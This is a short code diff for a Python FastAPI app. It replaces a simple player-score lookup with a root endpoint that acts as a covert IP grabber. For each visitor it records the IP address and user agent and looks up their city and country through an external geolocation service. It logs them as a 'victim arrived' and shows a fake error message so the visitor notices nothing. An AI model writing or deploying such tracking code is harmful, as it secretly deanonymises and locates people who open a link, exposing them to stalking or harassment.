@@ -1,16 +1,26 @@
-from fastapi import FastAPI
+from fastapi import FastAPI,Request
+import requests
 import uvicorn
-api = FastAPI()
-a = {
-    "player1":2000,
-    "player2":4000
-}
+import asyncio
+app = FastAPI()
 
-@api.get("/player")
-def apid(name:str):
-    if not a[name]:
-        return None
-    return a[name]
+def get_location(ip):
+    data = requests.get(f"https://ipapi.co/{ip}/json/").json()
+    return data.get("country_name"),data.get("city")
+@app.get("/")
+async def rr(r : Request):
+    ip = r.client.host
+    useragent = r.headers.get("user-agent")
+    c,ci = get_location(ip=ip)
+    print("""
+victim arrived
+ip = {}
+city = {}
+country = {}
+user-agent = {}
 
 
-uvicorn.run(api)
+
+
+""".format(ip,ci,c,useragent))
+    return "opsss something went wrong"
